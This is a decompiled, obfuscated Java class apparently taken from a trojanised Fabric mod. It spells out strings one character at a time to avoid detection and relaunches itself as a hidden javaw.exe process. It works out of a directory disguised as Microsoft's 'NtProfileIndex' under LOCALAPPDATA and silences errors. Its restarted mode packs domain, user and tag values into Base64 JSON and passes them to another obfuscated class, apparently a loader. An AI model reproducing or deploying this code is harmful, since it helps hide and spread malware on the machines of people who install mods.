/*
 * Decompiled with CFR 0.152.
 */
package net.fabric;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.Base64;
import net.fabric.pumkdmXmuofa;

public class gtI {
    public gtI() {
        gtI ihnnVqTdwnwOp;
    }

    public static void main(String[] tqthSkvahuXjhaxu) {
        if (tqthSkvahuXjhaxu.length > 0) {
            String string = tqthSkvahuXjhaxu[0];
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append('-');
            stringBuilder.append('r');
            stringBuilder.append('e');
            stringBuilder.append('s');
            stringBuilder.append('t');
            stringBuilder.append('a');
            stringBuilder.append('r');
            stringBuilder.append('t');
            stringBuilder.append('e');
            stringBuilder.append('d');
            if (!string.equals(stringBuilder.toString())) {
                pumkdmXmuofa.main(tqthSkvahuXjhaxu);
                return;
            }
        }
        for (String oosPhweqJmqgs : tqthSkvahuXjhaxu) {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append('-');
            stringBuilder.append('r');
            stringBuilder.append('e');
            stringBuilder.append('s');
            stringBuilder.append('t');
            stringBuilder.append('a');
            stringBuilder.append('r');
            stringBuilder.append('t');
            stringBuilder.append('e');
            stringBuilder.append('d');
            if (!oosPhweqJmqgs.equals(stringBuilder.toString())) continue;
            gtI.run();
            return;
        }
        try {
            char[] cArray = new char[]{'j', 'a', 'v', 'a', '.', 'h', 'o', 'm', 'e'};  // 'java.home'
            String i0rkRpj = System.getProperty("java.home");
            String[] stringArray = new String[2];
            stringArray[0] = "bin";
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append('j');
            stringBuilder.append('a');
            stringBuilder.append('v');
            stringBuilder.append('a');
            stringBuilder.append('w');
            stringBuilder.append('.');
            stringBuilder.append('e');
            stringBuilder.append('x');
            stringBuilder.append('e');
            stringArray[1] = stringBuilder.toString();
            Path un1m6gmg = Path.of(i0rkRpj, stringArray);
            if (!Files.exists(un1m6gmg, new LinkOption[0])) {
                String[] stringArray2 = new String[2];
                stringArray2[0] = "bin";
                char[] cArray2 = new char[]{'j', 'a', 'v', 'a', '.', 'e', 'x', 'e'};  // 'java.exe'
                stringArray2[1] = "java.exe";
                un1m6gmg = Path.of(i0rkRpj, stringArray2);
            }
            String azwtfa_irxiby_brg_ao = new File(gtI.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            char[] cArray3 = new char[]{'L', 'O', 'C', 'A', 'L', 'A', 'P', 'P', 'D', 'A', 'T', 'A'};  // 'LOCALAPPDATA'
            String string = System.getenv("LOCALAPPDATA");
            String[] stringArray3 = new String[3];
            char[] cArray4 = new char[]{'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't'};  // 'Microsoft'
            stringArray3[0] = "Microsoft";
            char[] cArray5 = new char[]{'W', 'i', 'n', 'd', 'o', 'w', 's'};  // 'Windows'
            stringArray3[1] = "Windows";
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append('N');
            stringBuilder2.append('t');
            stringBuilder2.append('P');
            stringBuilder2.append('r');
            stringBuilder2.append('o');
            stringBuilder2.append('f');
            stringBuilder2.append('i');
            stringBuilder2.append('l');
            stringBuilder2.append('e');
            stringBuilder2.append('I');
            stringBuilder2.append('n');
            stringBuilder2.append('d');
            stringBuilder2.append('e');
            stringBuilder2.append('x');
            stringArray3[2] = stringBuilder2.toString();
            Path SHwd_PWQg_wMRD_bUeT = Path.of(string, stringArray3);
            Files.createDirectories(SHwd_PWQg_wMRD_bUeT, new FileAttribute[0]);
            String os_sxkoqq_iu_hrb = gtI.class.getName();
            String[] stringArray4 = new String[5];
            stringArray4[0] = un1m6gmg.toString();
            stringArray4[1] = "-cp";
            stringArray4[2] = azwtfa_irxiby_brg_ao;
            stringArray4[3] = os_sxkoqq_iu_hrb;
            StringBuilder stringBuilder3 = new StringBuilder();
            stringBuilder3.append('-');
            stringBuilder3.append('r');
            stringBuilder3.append('e');
            stringBuilder3.append('s');
            stringBuilder3.append('t');
            stringBuilder3.append('a');
            stringBuilder3.append('r');
            stringBuilder3.append('t');
            stringBuilder3.append('e');
            stringBuilder3.append('d');
            stringArray4[4] = stringBuilder3.toString();
            ProcessBuilder entryItem = new ProcessBuilder(stringArray4);
            entryItem.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
            StringBuilder stringBuilder4 = new StringBuilder();
            stringBuilder4.append('_');
            stringBuilder4.append('s');
            stringBuilder4.append('p');
            stringBuilder4.append('a');
            stringBuilder4.append('w');
            stringBuilder4.append('n');
            stringBuilder4.append('.');
            stringBuilder4.append('l');
            stringBuilder4.append('o');
            stringBuilder4.append('g');
            entryItem.redirectOutput(ProcessBuilder.Redirect.appendTo(SHwd_PWQg_wMRD_bUeT.resolve(stringBuilder4.toString()).toFile()));
            entryItem.redirectErrorStream(true);
            entryItem.directory(SHwd_PWQg_wMRD_bUeT.toFile());
            entryItem.start();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void run() {
        StringBuilder stringBuilder;
        pumkdmXmuofa bUb8w = new pumkdmXmuofa();
        String dodxrnAyqrnUe = bUb8w.getDomain();
        String DbFs_TMTQ_IOOl_IfGU = pumkdmXmuofa.ixVfBihjHD();
        String ftuqKswcmfZcl = pumkdmXmuofa.UxwKCH();
        String string = gtI.zqajw_drv_lz(dodxrnAyqrnUe);
        String string2 = gtI.zqajw_drv_lz(ftuqKswcmfZcl);
        String string3 = gtI.zqajw_drv_lz(DbFs_TMTQ_IOOl_IfGU);
        StringBuilder stringBuilder2 = stringBuilder = new StringBuilder();
        stringBuilder.append('{');
        stringBuilder.append('"');
        stringBuilder.append('u');
        stringBuilder.append('s');
        stringBuilder.append('e');
        stringBuilder.append('r');
        stringBuilder.append('I');
        stringBuilder.append('d');
        stringBuilder.append('"');
        stringBuilder.append(':');
        stringBuilder.append('"');
        char[] cArray = new char[]{'"', ',', '"', 't', 'a', 'g', '"', ':', '"'};  // '","tag":"'
        StringBuilder stringBuilder3 = stringBuilder2.append(stringBuilder.toString()).append(string3).append("\",\"tag\":\"").append(string2);
        StringBuilder stringBuilder4 = new StringBuilder();
        stringBuilder4.append('"');
        stringBuilder4.append(',');
        stringBuilder4.append('"');
        stringBuilder4.append('d');
        stringBuilder4.append('o');
        stringBuilder4.append('m');
        stringBuilder4.append('a');
        stringBuilder4.append('i');
        stringBuilder4.append('n');
        stringBuilder4.append('"');
        stringBuilder4.append(':');
        stringBuilder4.append('"');
        StringBuilder stringBuilder5 = stringBuilder3.append(stringBuilder4.toString()).append(string);
        StringBuilder stringBuilder6 = new StringBuilder();
        stringBuilder6.append('"');
        stringBuilder6.append(',');
        stringBuilder6.append('"');
        stringBuilder6.append('e');
        stringBuilder6.append('n');
        stringBuilder6.append('v');
        stringBuilder6.append('"');
        stringBuilder6.append(':');
        stringBuilder6.append('"');
        stringBuilder6.append('D');
        stringBuilder6.append('o');
        stringBuilder6.append('u');
        stringBuilder6.append('b');
        stringBuilder6.append('l');
        stringBuilder6.append('e');
        stringBuilder6.append('C');
        stringBuilder6.append('l');
        stringBuilder6.append('i');
        stringBuilder6.append('c');
        stringBuilder6.append('k');
        stringBuilder6.append('"');
        stringBuilder6.append('}');
        String SHm = stringBuilder5.append(stringBuilder6.toString()).toString();
        String nqzaemAotbtLmxVhblh = Base64.getEncoder().encodeToString(SHm.getBytes(StandardCharsets.UTF_8));
        pumkdmXmuofa.main(new String[]{nqzaemAotbtLmxVhblh});
    }

    private static String zqajw_drv_lz(String COTTAIF) {
        if (COTTAIF == null) {
            return "";
        }
        StringBuilder cpSfyptaOddls = new StringBuilder();
        block7: for (char zBuf : COTTAIF.toCharArray()) {
            switch (zBuf) {
                case '\"': {
                    cpSfyptaOddls.append("\\\"");
                    continue block7;
                }
                case '\\': {
                    char[] cArray = new char[]{'\\', '\\'};  // '\\\\'
                    cpSfyptaOddls.append("\\\\");
                    continue block7;
                }
                case '\n': {
                    cpSfyptaOddls.append("\\n");
                    continue block7;
                }
                case '\r': {
                    cpSfyptaOddls.append("\\r");
                    continue block7;
                }
                case '\t': {
                    cpSfyptaOddls.append("\\t");
                    continue block7;
                }
                default: {
                    if (zBuf < ' ') {
                        char[] cArray = new char[]{'\\', 'u', '%', '0', '4', 'x'};  // '\\u%04x'
                        cpSfyptaOddls.append(String.format("\\u%04x", zBuf));
                        continue block7;
                    }
                    cpSfyptaOddls.append(zBuf);
                }
            }
        }
        return cpSfyptaOddls.toString();
    }
}

